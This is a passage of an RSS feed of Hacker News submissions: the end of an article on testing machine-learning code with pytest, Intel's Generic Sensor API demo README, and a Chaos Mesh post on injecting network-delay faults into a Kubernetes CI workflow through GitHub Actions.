    <span>assert</span> <span>(</span><span>pred_train</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_train</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
    <span>assert</span> <span>(</span><span>pred_test</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_test</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
</code></pre></div></div>

<p>Here, we‚Äôll check for test set leakage (i.e., duplicate rows in train/test splits) by concatenating train and test data, dropping duplicates, and checking the number of rows. (Note: Other leakages include <a href="https://www.fast.ai/2017/11/13/validation-sets/#time-series" target="_blank">temporal leaks</a> and <a href="https://en.wikipedia.org/wiki/Leakage_(machine_learning)#Feature_leakage" target="_blank">feature leaks</a>; we won‚Äôt cover them here.)</p>

<div><div><pre><code><span>def</span> <span>test_data_leak_in_test_data</span><span>(</span><span>dummy_titanic_df</span><span>):</span>
    <span>train</span><span>,</span> <span>test</span> <span>=</span> <span>dummy_titanic_df</span>

    <span>concat_df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>train</span><span>,</span> <span>test</span><span>])</span>
    <span>concat_df</span><span>.</span><span>drop_duplicates</span><span>(</span><span>inplace</span><span>=</span><span>True</span><span>)</span>

    <span>assert</span> <span>concat_df</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>+</span> <span>test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<p>Given perfectly separable data and unlimited depth, our decision tree should be able to ‚Äúmemorise‚Äù the training data and <em><a href="https://en.wikipedia.org/wiki/Overfitting" target="_blank">overfit</a> completely</em>. In other words, if we train <em>and</em> evaluate on the training data, we should get 100% accuracy. (Note: the Titanic data isn‚Äôt perfectly separable so we‚Äôll create a small data sample for this.)</p>

<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>fixture</span>
<span>def</span> <span>dummy_feats_and_labels</span><span>():</span>
    <span>feats</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>0.7057</span><span>,</span> <span>-</span><span>5.4981</span><span>,</span> <span>8.3368</span><span>,</span> <span>-</span><span>2.8715</span><span>],</span>
                      <span>[</span><span>2.4391</span><span>,</span> <span>6.4417</span><span>,</span> <span>-</span><span>0.80743</span><span>,</span> <span>-</span><span>0.69139</span><span>],</span>
                      <span>[</span><span>-</span><span>0.2062</span><span>,</span> <span>9.2207</span><span>,</span> <span>-</span><span>3.7044</span><span>,</span> <span>-</span><span>6.8103</span><span>],</span>
                      <span>[</span><span>4.2586</span><span>,</span> <span>11.2962</span><span>,</span> <span>-</span><span>4.0943</span><span>,</span> <span>-</span><span>4.3457</span><span>],</span>
                      <span>[</span><span>-</span><span>2.343</span><span>,</span> <span>12.9516</span><span>,</span> <span>3.3285</span><span>,</span> <span>-</span><span>5.9426</span><span>],</span>
                      <span>[</span><span>-</span><span>2.0545</span><span>,</span> <span>-</span><span>10.8679</span><span>,</span> <span>9.4926</span><span>,</span> <span>-</span><span>1.4116</span><span>],</span>
                      <span>[</span><span>2.2279</span><span>,</span> <span>4.0951</span><span>,</span> <span>-</span><span>4.8037</span><span>,</span> <span>-</span><span>2.1112</span><span>],</span>
                      <span>[</span><span>-</span><span>6.1632</span><span>,</span> <span>8.7096</span><span>,</span> <span>-</span><span>0.21621</span><span>,</span> <span>-</span><span>3.6345</span><span>],</span>
                      <span>[</span><span>0.52374</span><span>,</span> <span>3.644</span><span>,</span> <span>-</span><span>4.0746</span><span>,</span> <span>-</span><span>1.9909</span><span>],</span>
                      <span>[</span><span>1.5077</span><span>,</span> <span>1.9596</span><span>,</span> <span>-</span><span>3.0584</span><span>,</span> <span>-</span><span>0.12243</span><span>]</span>
                      <span>])</span>
    <span>labels</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>])</span>
    <span>return</span> <span>feats</span><span>,</span> <span>labels</span>

<span>def</span> <span>test_dt_overfit</span><span>(</span><span>dummy_feats_and_labels</span><span>):</span>
    <span>feats</span><span>,</span> <span>labels</span> <span>=</span> <span>dummy_feats_and_labels</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>feats</span><span>,</span> <span>labels</span><span>)</span>
    <span>pred</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>dt</span><span>.</span><span>predict</span><span>(</span><span>feats</span><span>))</span>

    <span>assert</span> <span>np</span><span>.</span><span>array_equal</span><span>(</span><span>labels</span><span>,</span> <span>pred</span><span>),</span> <span>'DecisionTree should fit data perfectly and prediction should == labels.'</span>
</code></pre></div></div>

<p>Lastly, we check if increasing tree depth leads to increased accuracy and AUC ROC on <em>training</em> data (though it‚Äôll overfit and perform poorly on <em>validation</em> data). In the test below, we fit trees of depth one to 10 and ensure training accuracy and AUC increases consistently.</p>

<div><div><pre><code><span>def</span> <span>test_dt_increase_acc</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>_</span><span>,</span> <span>_</span> <span>=</span> <span>dummy_titanic</span>

    <span>acc_list</span> <span>=</span> <span>[]</span>
    <span>auc_list</span> <span>=</span> <span>[]</span>
    <span>for</span> <span>depth</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>):</span>
        <span>dt</span> <span>=</span> <span>DecisionTree</span><span>(</span><span>depth_limit</span><span>=</span><span>depth</span><span>)</span>
        <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
        <span>pred</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
        <span>pred_binary</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>pred</span><span>)</span>
        <span>acc_list</span><span>.</span><span>append</span><span>(</span><span>accuracy_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred_binary</span><span>))</span>
        <span>auc_list</span><span>.</span><span>append</span><span>(</span><span>roc_auc_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred</span><span>))</span>

    <span>assert</span> <span>sorted</span><span>(</span><span>acc_list</span><span>)</span> <span>==</span> <span>acc_list</span><span>,</span> <span>'Accuracy should increase as tree depth increases.'</span>
    <span>assert</span> <span>sorted</span><span>(</span><span>auc_list</span><span>)</span> <span>==</span> <span>auc_list</span><span>,</span> <span>'AUC ROC should increase as tree depth increases.'</span>
</code></pre></div></div>

<h2 id="post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</h2>

<p>In post-train tests, we want to <strong>check if the model is behaving ‚Ä¶</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/testing-ml/">https://eugeneyan.com/writing/testing-ml/</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/testing-ml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523930</guid>
            <pubDate>Sat, 19 Sep 2020 01:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generic Sensor API Playground]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24523862">thread link</a>) | @victorbreder
<br/>
September 18, 2020 | https://intel.github.io/generic-sensor-demos/ | <a href="https://web.archive.org/web/*/https://intel.github.io/generic-sensor-demos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>This repository contains applications that demonstrate how to use the
<a href="https://www.w3.org/TR/generic-sensor/">Generic Sensor API</a>.</p>

<p>The <a href="https://www.w3.org/TR/generic-sensor/">Generic Sensor API</a> is a set of
interfaces which expose sensor devices to the web platform. The API consists
of the base <a href="https://w3c.github.io/sensors/#the-sensor-interface">Sensor</a>
interface and a set of concrete sensor classes built on top, such as
<a href="https://w3c.github.io/accelerometer/#accelerometer-interface">Accelerometer</a>,
<a href="https://w3c.github.io/accelerometer/#linearaccelerationsensor-interface">LinearAccelerationSensor</a>,
<a href="https://w3c.github.io/gyroscope/#gyroscope-interface">Gyroscope</a>,
<a href="https://w3c.github.io/orientation-sensor/#absoluteorientationsensor-interface">AbsoluteOrientationSensor</a>
and <a href="https://w3c.github.io/orientation-sensor/#relativeorientationsensor-interface">RelativeOrientationSensor</a>.</p>

<p>The Generic Sensor API is very simple and easy-to-use! The Sensor interface has
<a href="https://w3c.github.io/sensors/#sensor-start"><code>start()</code></a> and
<a href="https://w3c.github.io/sensors/#sensor-stop"><code>stop()</code></a> methods to control sensor state
and several event handlers for receiving notifications about sensor activation, errors and newly
available readings. The concrete sensor classes usually add their specific reading attributes to
the base class.</p>

<h2 id="launch-instructions">Launch instructions</h2>

<p>The demo apps work with Chrome 63 or later. If you have an older version of Chrome, please enable
the <a href="chrome://flags/#enable-generic-sensor">chrome://flags/#enable-generic-sensor</a> flag, before
running the demos.</p>

<p>If the demo is using environmental sensors, such as,
<a href="https://w3c.github.io/magnetometer/#magnetometer-interface">Magnetometer</a> or
<a href="https://w3c.github.io/ambient-light/#ambient-light-sensor-interface">AmbientLightSensor</a>,
please also enable
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag.</p>

<p>You could run demos from <a href="https://intel.github.io/generic-sensor-demos/">GitHub Pages for this repository.</a></p>

<h2 id="demos-description">Demos description</h2>

<h3 id="punchmeter-code"><a href="https://intel.github.io/generic-sensor-demos/punchmeter/">Punchmeter</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/punchmeter">code</a>)</h3>

<p>Punchmeter is a simple application that calculates user‚Äôs punch speed using
LinearAcceleration sensor. To try it the user should make a punch holding
mobile device in his/her hand.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/punchmeter.gif" alt="Punchmeter demo"></p>

<hr>

<h3 id="orientation-phone-code"><a href="https://intel.github.io/generic-sensor-demos/orientation-phone/">Orientation phone</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/orientation-phone">code</a>)</h3>

<p>This simple demo illustrates how an absolute orientation sensor can be used to
modify rotation quaternion of a 3D model. The <code>model</code> is a three.js
<a href="https://threejs.org/docs/index.html#api/core/Object3D"><code>Object3D</code></a> class instance
that has <a href="https://threejs.org/docs/index.html#api/core/Object3D.quaternion"><code>quaternion</code></a>
property.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/orientation-phone.png" alt="Orientation sensor demo"></p>

<hr>

<h3 id="360-degree-beach-panorama-demo-code"><a href="https://intel.github.io/generic-sensor-demos/websensor-panorama/">360 degree beach panorama demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/websensor-panorama">code</a>)</h3>

<p>The demo presents a 360 degree panorama view of a beach with an added sound effect.
The user can look around the scene by moving their device.
The demo uses the orientation sensor to enable the user to look around.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/websensor-panorama/websensor-panorama.gif?raw=true" alt="360 Panorama"></p>

<hr>

<h3 id="360-degree-video-demo-code"><a href="https://intel.github.io/generic-sensor-demos/websensor-video/">360 degree video demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/websensor-video">code</a>)</h3>

<p>This demo presents a 360 degree video that the user can look around by moving their device.
The user can also play the video in both forward and reverse by holding the device and walking
forward and backward, respectively.
The demo uses the orientation sensor to enable the user to look around and the accelerometer for
walking detection to enable the user to control video playback by walking.</p>

<hr>

<h3 id="ambient-map-demo-code"><a href="https://intel.github.io/generic-sensor-demos/ambient-map/build/bundled/">Ambient Map demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/ambient-map/build/bundled">code</a>)</h3>

<p>This web application demonstrates how Ambient light sensor can be used to control style of a map widget.
When ambient illuminance level is less than 10 lumen, night mode style will be used.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/ambient-map/ambient-map.gif?raw=true" alt="Ambient Map demo"></p>

<hr>

<h3 id="sensor-info-demo-code"><a href="https://intel.github.io/generic-sensor-demos/sensor-info/build/bundled/">Sensor Info demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/sensor-info/build/bundled">code</a>)</h3>

<p>This web application presents information about device sensors and their reading values.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/sensor-info/sensor-info.gif?raw=true" alt="Sensor Info demo"></p>

<hr>

<h3 id="vr-button-demo-code"><a href="https://intel.github.io/generic-sensor-demos/vr-button/build/bundled/">VR Button demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/vr-button/build/bundled">code</a>)</h3>

<p>This web application demonstrates how Magnetometer sensor can be used to provide user input for WebVR
content. If you have VR enclosure with magnet button, you can interact with objects in the scene by
sliding button down.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/vr-button/vr-button.gif?raw=true" alt="VR Button demo"></p>

<hr>

<h3 id="sensor-tester-code"><a href="https://intel.github.io/generic-sensor-demos/sensor-tester/build/bundled/">Sensor tester</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/sensor-tester">code</a>)</h3>

<p>This web application allows to test functionality of the sensors, correctness of their models in correspondence with respective specification.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/sensor-tester.png?raw=true" alt="Sensor tester"></p>

<h2 id="development-environment">Development environment</h2>

<p>If you would like to modify the existing code and experiment with the sensors API
your code must be hosted on a web server that supports HTTPS.
The simplest way is to fork this repository and enable
<a href="https://help.github.com/articles/configuring-a-publishing-source-for-github-pages/">GitHub Pages</a>
for your fork. Alternatevely, you can serve your web application locally, for this, we recommend to use
<a href="https://chrome.google.com/webstore/detail/web-server-for-chrome/ofhbbkphhbklhfoeikjpcbhemlocgigb">Web Server for Chrome</a>.
If you are developing for mobile devices,set up
<a href="https://developers.google.com/web/tools/chrome-devtools/remote-debugging/local-server">port forwarding</a>
for your local server, and you are good to go!</p>

<h2 id="reporting-a-security-issue">Reporting a security issue</h2>
<p>If you have information about a security issue or vulnerability with an Intel-maintained open source project on https://github.com/intel, please send an e-mail to secure-opensource@intel.com. Encrypt sensitive information using our PGP public key. For issues related to Intel products, please visit https://security-center.intel.com.</p>


      
    </section></div>]]>
            </description>
            <link>https://intel.github.io/generic-sensor-demos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523862</guid>
            <pubDate>Sat, 19 Sep 2020 01:15:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Integrate Chaos Engineering into Your CI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24523156">thread link</a>) | @ngaut
<br/>
September 18, 2020 | https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/ | <a href="https://web.archive.org/web/*/https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img alt="chaos-mesh-action - Integrate-Chaos-Engineering-into-Your-CI" src="https://chaos-mesh.org/assets/images/chaos-mesh-action-7f3cb1496d259110ce51cfcaa49ae146.png"></p><p><a href="https://chaos-mesh.org/" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> is a cloud-native chaos testing platform that orchestrates chaos in Kubernetes environments. While it‚Äôs well received in the community with its rich fault injection types and easy-to-use dashboard, it was difficult  to use Chaos Mesh with end-to-end testing or the continuous integration (CI) process. As a result, problems introduced during system development could not be discovered before the release.</p><p>In this article, I will share how we use chaos-mesh-action, a GitHub action to integrate Chaos Mesh into the CI process.</p><p>chaos-mesh-action is available on <a href="https://github.com/marketplace/actions/chaos-mesh" target="_blank" rel="noopener noreferrer">GitHub market</a>, and the source code is on <a href="https://github.com/chaos-mesh/chaos-mesh-action" target="_blank" rel="noopener noreferrer">GitHub</a>.</p><h2>Design of chaos-mesh-action</h2><p><a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer">GitHub Action</a> is a CI/CD feature natively supported by GitHub, through which we can easily build automated and customized software development workflows in the GitHub repository. </p><p>Combined with GitHub actions, Chaos Mesh can be more easily integrated into the daily development and testing of the system, thus guaranteeing that each code submission on GitHub is bug-free and won‚Äôt damage existing code. The following figure shows chaos-mesh-action integrated into the CI workflow:</p><p><img alt="chaos-mesh-action integrate in the CI workflow" src="https://chaos-mesh.org/assets/images/chaos-mesh-action-integrate-in-the-ci-workflow-6b70ea3c8457f74cfd89305a20d9bec4.png"></p><h2>Using chaos-mesh-action in GitHub workflow</h2><p><a href="https://github.com/marketplace/actions/chaos-mesh" target="_blank" rel="noopener noreferrer">chaos-mesh-action</a> works in Github workflows. A GitHub workflow is a configurable automated process that you can set up in your repository to build, test, package, release, or deploy any GitHub project. To integrate Chaos Mesh in your CI, do the following:</p><ol><li>Design a workflow.</li><li>Create a workflow.</li><li>Run the workflow.</li></ol><h3>Design a workflow</h3><p>Before you design a workflow, you must consider the following issues:</p><ul><li>What functions are we going to test in this workflow?</li><li>What types of faults will we inject? </li><li>How do we verify the correctness of the system?</li></ul><p>As an example, let‚Äôs design a simple test workflow that includes the following steps: </p><ol><li>Create two Pods in a Kubernetes cluster.</li><li>Ping one pod from the other. </li><li>Use Chaos Mesh to inject network delay chaos and test whether the ping command is affected.</li></ol><h3>Create the workflow</h3><p>After you design the workflow, the next step is to create it. </p><ol><li>Navigate to the GitHub repository that contains the software you want to test.</li><li>To start creating a workflow, click <strong>Actions</strong>, and then click the <strong>"New workflow</strong>" button:</li></ol><p><img alt="Creating a workflow" src="https://chaos-mesh.org/assets/images/creating-a-workflow-17c7622de0400b1cf0d0bd091a1c0561.png"></p><p>A workflow is essentially the configuration of jobs that take place sequentially and automatically. Note that the jobs are configured in a single file. For better illustration, we split the script into different job groups as shown below: </p><ul><li><p>Set the workflow name and trigger rules.</p><p>This job names the workflow "Chaos.‚Äù When the code is pushed to the master branch or a pull request is submitted to the master branch, this workflow is triggered.</p><div><div><div tabindex="0"><div><p><span>name</span><span>:</span><span> Chaos</span></p><p><span></span><span>on</span><span>:</span><span></span></p><p><span> </span><span>push</span><span>:</span><span></span></p><p><span>   </span><span>branches</span><span>:</span><span></span></p><p><span>     </span><span>-</span><span> master</span></p><p><span> </span><span>pull_request</span><span>:</span><span></span></p><p><span>   </span><span>branches</span><span>:</span><span></span></p><p><span>     </span><span>-</span><span> master</span></p></div></div></div></div></li><li><p>Install the CI-related environment.</p><p>This configuration specifies the operating system (Ubuntu), and that it uses <a href="https://github.com/marketplace/actions/kind-cluster" target="_blank" rel="noopener noreferrer">helm/kind-action</a> to create a Kind cluster. Then, it outputs related information about the cluster. Finally, it checks out the GitHub repository for the workflow to access. </p><div><div><div tabindex="0"><div><p><span>jobs</span><span>:</span><span></span></p><p><span> </span><span>build</span><span>:</span><span></span></p><p><span>   </span><span>runs-on</span><span>:</span><span> ubuntu</span><span>-</span><span>latest</span></p><p><span>   </span><span>steps</span><span>:</span><span></span></p><p><span>   </span><span>-</span><span> </span><span>name</span><span>:</span><span> Creating kind cluster</span></p><p><span>     </span><span>uses</span><span>:</span><span> helm/kind</span><span>-</span><span>action@v1.0.0</span><span>-</span><span>rc.1</span></p><p><span>   </span><span>-</span><span> </span><span>name</span><span>:</span><span> Print cluster information</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       kubectl config view</span></p><p><span>       kubectl cluster-info</span></p><p><span>       kubectl get nodes</span></p><p><span>       kubectl get pods -n kube-system</span></p><p><span>       helm version</span></p><p><span>       kubectl version</span><span></span></p><p><span>   </span><span>-</span><span> </span><span>uses</span><span>:</span><span> actions/checkout@v2</span></p></div></div></div></div></li><li><p>Deploy the application.</p><p>In our example, this job deploys an application that creates two Kubernetes Pods.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Deploy an application</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       kubectl apply -f https://raw.githubusercontent.com/chaos-mesh/apps/master/ping/busybox-statefulset.yaml</span></p></div></div></div></div></li><li><p>Inject chaos with chaos-mesh-action.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Run chaos mesh action</span></p><p><span>    </span><span>uses</span><span>:</span><span> chaos</span><span>-</span><span>mesh/chaos</span><span>-</span><span>mesh</span><span>-</span><span>action@xiang/refine_script</span></p><p><span>    </span><span>env</span><span>:</span><span></span></p><p><span>      </span><span>CFG_BASE64</span><span>:</span><span> YXBpVmVyc2lvbjogY2hhb3MtbWVzaC5vcmcvdjFhbHBoYTEKa2luZDogTmV0d29ya0NoYW9zCm1ldGFkYXRhOgogIG5hbWU6IG5ldHdvcmstZGVsYXkKICBuYW1lc3BhY2U6IGJ1c3lib3gKc3BlYzoKICBhY3Rpb246IGRlbGF5ICMgdGhlIHNwZWNpZmljIGNoYW9zIGFjdGlvbiB0byBpbmplY3QKICBtb2RlOiBhbGwKICBzZWxlY3RvcjoKICAgIHBvZHM6CiAgICAgIGJ1c3lib3g6CiAgICAgICAgLSBidXN5Ym94LTAKICBkZWxheToKICAgIGxhdGVuY3k6ICIxMG1zIgogIGR1cmF0aW9uOiAiNXMiCiAgc2NoZWR1bGVyOgogICAgY3JvbjogIkBldmVyeSAxMHMiCiAgZGlyZWN0aW9uOiB0bwogIHRhcmdldDoKICAgIHNlbGVjdG9yOgogICAgICBwb2RzOgogICAgICAgIGJ1c3lib3g6CiAgICAgICAgICAtIGJ1c3lib3gtMQogICAgbW9kZTogYWxsCg==</span></p></div></div></div></div><p>With chaos-mesh-action, the installation of Chaos Mesh and the injection of chaos complete automatically. You simply need to prepare the chaos configuration that you intend to use to get its Base64 representation. Here, we want to inject network delay chaos into the Pods, so we use the original chaos configuration as follows:</p><div><div><div tabindex="0"><div><p><span>apiVersion</span><span>:</span><span> chaos</span><span>-</span><span>mesh.org/v1alpha1</span></p><p><span></span><span>kind</span><span>:</span><span> NetworkChaos</span></p><p><span></span><span>metadata</span><span>:</span><span></span></p><p><span> </span><span>name</span><span>:</span><span> network</span><span>-</span><span>delay</span></p><p><span> </span><span>namespace</span><span>:</span><span> busybox</span></p><p><span></span><span>spec</span><span>:</span><span></span></p><p><span> </span><span>action</span><span>:</span><span> delay </span><span></span></p><p><span> </span><span>mode</span><span>:</span><span> all</span></p><p><span> </span><span>selector</span><span>:</span><span></span></p><p><span>   </span><span>pods</span><span>:</span><span></span></p><p><span>     </span><span>busybox</span><span>:</span><span></span></p><p><span>       </span><span>-</span><span> busybox</span><span>-</span><span>0</span><span></span></p><p><span> </span><span>delay</span><span>:</span><span></span></p><p><span>   </span><span>latency</span><span>:</span><span> </span><span>"10ms"</span><span></span></p><p><span> </span><span>duration</span><span>:</span><span> </span><span>"5s"</span><span></span></p><p><span> </span><span>scheduler</span><span>:</span><span></span></p><p><span>   </span><span>cron</span><span>:</span><span> </span><span>"@every 10s"</span><span></span></p><p><span> </span><span>direction</span><span>:</span><span> to</span></p><p><span> </span><span>target</span><span>:</span><span></span></p><p><span>   </span><span>selector</span><span>:</span><span></span></p><p><span>     </span><span>pods</span><span>:</span><span></span></p><p><span>       </span><span>busybox</span><span>:</span><span></span></p><p><span>         </span><span>-</span><span> busybox</span><span>-</span><span>1</span><span></span></p><p><span>   </span><span>mode</span><span>:</span><span> all</span></p></div></div></div></div><p>You can obtain the Base64 value of the above chaos configuration file using the following command:</p></li><li><p>Verify the system correctness.</p><p>In this job,  the workflow pings one Pod from the other and observes the changes in network delay.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Verify</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       echo "do some verification"</span></p><p><span>       kubectl exec busybox-0 -it -n busybox -- ping -c 30 busybox-1.busybox.busybox.svc</span></p></div></div></div></div></li></ul><h3>Run the workflow</h3><p>Now that the workflow is configured, we can trigger it by submitting a pull request to the master branch. When the workflow completes, the verification job outputs of the results that look similar to the following:</p><div><div><div tabindex="0"><div><p><span>do</span><span> some verification</span></p><p><span>Unable to use a TTY - input is not a terminal or the right kind of </span><span>file</span><span></span></p><p><span>PING busybox-1.busybox.busybox.svc </span><span>(</span><span>10.244</span><span>.0.6</span><span>)</span><span>: </span><span>56</span><span> data bytes</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>0</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.069</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>1</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.136</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>2</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.192</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>3</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.129</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>4</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.120</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>5</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.070</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>6</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.073</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>7</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.111</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>8</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.070</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>9</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.077</span><span> ms</span></p><p><span>‚Ä¶‚Ä¶</span></p></div></div></div></div><p>The output indicates a regular series of 10-millisecond delays that last about 5 seconds each. This is consistent with the chaos configuration we injected into chaos-mesh-action.  </p><h2>Current status and next steps</h2><p>At present, we have applied chaos-mesh-action to the <a href="https://github.com/pingcap/tidb-operator" target="_blank" rel="noopener noreferrer">TiDB Operator</a> project. The workflow is injected with the Pod chaos to verify the restart function of the specified instances of the operator. The purpose is to ensure that tidb-operator can work normally when the pods of the operator are randomly deleted by the injected faults. You can view the <a href="https://github.com/pingcap/tidb-operator/actions?query=workflow%3Achaos" target="_blank" rel="noopener noreferrer">TiDB Operator page</a> for more details.</p><p>In the future, we plan to apply chaos-mesh-action to more tests to ensure the stability of TiDB and related components. You are welcome to create your own workflow using chaos-mesh-action.</p><p>If you find a bug or think something is missing, feel free to file an issue, open a pull request (PR), or join us on the <a href="https://join.slack.com/t/cloud-native/shared_invite/zt-fyy3b8up-qHeDNVqbz1j8HDY6g1cY4w" target="_blank" rel="noopener noreferrer">#project-chaos-mesh</a> channel in the <a href="https://www.cncf.io/" target="_blank" rel="noopener noreferrer">CNCF</a> slack workspace. </p></section></div>]]>
            </description>
            <link>https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523156</guid>
            <pubDate>Sat, 19 Sep 2020 00:04:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Edge of Emulation: Magic Reader]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522898">thread link</a>) | @Parseus
<br/>
September 18, 2020 | https://shonumi.github.io/articles/art23.html | <a href="https://web.archive.org/web/*/https://shonumi.github.io/articles/art23.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
